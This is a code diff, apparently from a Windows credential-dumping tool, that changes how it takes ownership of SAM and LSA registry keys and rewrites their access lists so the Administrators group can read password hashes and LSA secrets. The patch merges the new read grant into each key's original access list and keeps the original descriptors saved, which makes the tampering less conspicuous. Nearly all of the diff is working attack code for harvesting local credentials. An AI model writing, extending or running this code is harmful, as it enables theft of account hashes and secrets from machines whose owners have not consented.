@@ -489,13 +489,17 @@ void getSAM(PSAM samRegEntries[], PULONG size) {
 static DACLSAVE savesPool[MAX_DACLSAVES];
 static ULONG savesCount;
 
-// Save the original owner + DACL of one key, take its ownership and swap its DACL so Administrators get KEY_READ.
-// Child keys carry protected DACLs, so a grant on the parent never reaches them: every node of the subtree must be rewritten.
-static void grantRegistryKeyDacl(const WCHAR RegPath[], PDACLSAVE* saves, PSECURITY_DESCRIPTOR newDescriptor) {
+// Save the original owner + DACL of one key, take its ownership and swap its DACL for a merge of the original ACEs plus the new Administrators KEY_READ ACE.
+// Child keys carry protected DACLs, so a grant on the parent never reaches them: each key the dump needs is rewritten individually.
+static void grantRegistryKeyDacl(const WCHAR RegPath[], PDACLSAVE* saves, PSECURITY_DESCRIPTOR newDescriptor, PSID administratorSid) {
 	HANDLE key;
 	OBJECT_ATTRIBUTES attributes;
 	UNICODE_STRING UnicodeRegPath;
 	ULONG lengthBuff = MAX_SECURITY_LENGTH;
+	PRELDESCRIPTOR savedRel;
+	PACL originalDacl;
+	ULONG aceRevision = ACL_REVISION;
+	ULONG mergedAcl[(MAX_SECURITY_LENGTH + 64) / sizeof(ULONG)];
 	ULONG ret;
 
 	if (savesCount == MAX_DACLSAVES) {
@@ -529,6 +533,42 @@ static void grantRegistryKeyDacl(const WCHAR RegPath[], PDACLSAVE* saves, PSECUR
 
 	pMyNtClose(key);
 
+	// The new ACE is merged into a copy of the original DACL, so the current permissions stay in place the whole time instead of the key holding only the Administrators ACE.
+	savedRel = (PRELDESCRIPTOR)save->sd;
+	originalDacl = (PACL)((PBYTE)savedRel + savedRel->Dacl);
+
+	if (savedRel->Dacl != 0) {
+		DebugPrintf("Original DACL: %hu ACEs in %hu bytes; copying it and appending the new ACE\n", originalDacl->AceCount, originalDacl->AclSize);
+		CopyMemory(mergedAcl, originalDacl, originalDacl->AclSize);
+		aceRevision = originalDacl->AclRevision;
+	}
+	else {
+		// No original DACL present: start from an empty one.
+		ret = pMyRtlCreateAcl((PACL)mergedAcl, sizeof(mergedAcl), ACL_REVISION);
+		DebugPrintf("RtlCreateAcl(merged, empty start) returned 0x%08lX\n", ret);
+
+		if (!NT_SUCCESS(ret)) {
+			exit(ret);
+		}
+	}
+
+	// RtlAddAccessAllowedAceEx appends at the ACL's current end and bumps AceCount + AclSize.
+	// S-1-5-32-544 is 8 SID header bytes + 2 * 4 subauthority bytes, so the appended ACE needs 8 + 16 = 24 bytes beyond the copied ACL, well within the buffer.
+	ret = pMyRtlAddAccessAllowedAceEx((PACL)mergedAcl, aceRevision, CONTAINER_INHERIT_ACE | OBJECT_INHERIT_ACE, KEY_READ, administratorSid);
+	DebugPrintf("RtlAddAccessAllowedAceEx(merged) returned 0x%08lX\n", ret);
+
+	if (!NT_SUCCESS(ret)) {
+		exit(ret);
+	}
+
+	// The merged ACL goes into the descriptor that gets written below; the owner part (Administrators) stays untouched.
+	ret = pMyRtlSetDaclSecurityDescriptor(newDescriptor, TRUE, (PACL)mergedAcl, FALSE);
+	DebugPrintf("RtlSetDaclSecurityDescriptor(merged) returned 0x%08lX\n", ret);
+
+	if (!NT_SUCCESS(ret)) {
+		exit(ret);
+	}
+
 	// SeTakeOwnershipPrivilege allows taking ownership of the key even when the DACL denies WRITE_OWNER to Administrators.
 	ret = pMyNtOpenKey(&key, WRITE_OWNER, &attributes);
 	DebugPrintf("NtOpenKey(key, WRITE_OWNER) returned 0x%08lX\n", ret);
@@ -555,7 +595,7 @@ static void grantRegistryKeyDacl(const WCHAR RegPath[], PDACLSAVE* saves, PSECUR
 	}
 
 	ret = pMyNtSetSecurityObject(key, DACL_SECURITY_INFORMATION, newDescriptor);
-	DebugPrintf("NtSetSecurityObject(key, DACL) returned 0x%08lX; Administrators group now holds read access\n", ret);
+	DebugPrintf("NtSetSecurityObject(key, DACL) returned 0x%08lX; Administrators group now holds read access besides the original ACEs\n", ret);
 
 	if (!NT_SUCCESS(ret)) {
 		exit(ret);
@@ -570,7 +610,7 @@ static void grantRegistryKeyDacl(const WCHAR RegPath[], PDACLSAVE* saves, PSECUR
 }
 
 // The dump only opens the RID subkeys of Users (children whose name starts with 00, within the same first MAX_SAM_ENTRIES window), so exactly those get the same treatment.
-static void grantRegistryUsers(const WCHAR UsersPath[], PDACLSAVE* saves, PSECURITY_DESCRIPTOR newDescriptor) {
+static void grantRegistryUsers(const WCHAR UsersPath[], PDACLSAVE* saves, PSECURITY_DESCRIPTOR newDescriptor, PSID administratorSid) {
 	UCHAR fullInfoBuffer[512];
 	UCHAR basicInfoBuffer[sizeof(KEY_BASIC_INFORMATION) + MAX_SECURITY_LENGTH];
 	PKEY_FULL_INFORMATION fullInfo = (PKEY_FULL_INFORMATION)fullInfoBuffer;
@@ -622,7 +662,7 @@ static void grantRegistryUsers(const WCHAR UsersPath[], PDACLSAVE* saves, PSECUR
 			wcscpy_s(ridPath, MAX_PATH, UsersPath);
 			wcsncat_s(ridPath, MAX_PATH, ridName, _TRUNCATE);
 
-			grantRegistryKeyDacl(ridPath, saves, newDescriptor);
+			grantRegistryKeyDacl(ridPath, saves, newDescriptor, administratorSid);
 		}
 	}
 
@@ -709,9 +749,9 @@ PDACLSAVE grantRegistryAccess() {
 
 	PDACLSAVE saves = NULL;
 
-	grantRegistryKeyDacl(RegPathAccount, &saves, &newDescriptor);
-	grantRegistryKeyDacl(RegPathUsers, &saves, &newDescriptor);
-	grantRegistryUsers(RegPathUsers, &saves, &newDescriptor);
+	grantRegistryKeyDacl(RegPathAccount, &saves, &newDescriptor, (PSID)administratorSid);
+	grantRegistryKeyDacl(RegPathUsers, &saves, &newDescriptor, (PSID)administratorSid);
+	grantRegistryUsers(RegPathUsers, &saves, &newDescriptor, (PSID)administratorSid);
 
 	for (int i = 0; i < 4; i++) {
 		WCHAR RegLsaChild[MAX_PATH] = L"\0";
@@ -719,7 +759,7 @@ PDACLSAVE grantRegistryAccess() {
 		wcscpy_s(RegLsaChild, MAX_PATH, RegLsa);
 		wcsncat_s(RegLsaChild, MAX_PATH, lsaChildren[i], _TRUNCATE);
 
-		grantRegistryKeyDacl(RegLsaChild, &saves, &newDescriptor);
+		grantRegistryKeyDacl(RegLsaChild, &saves, &newDescriptor, (PSID)administratorSid);
 	}
 
 	return saves;
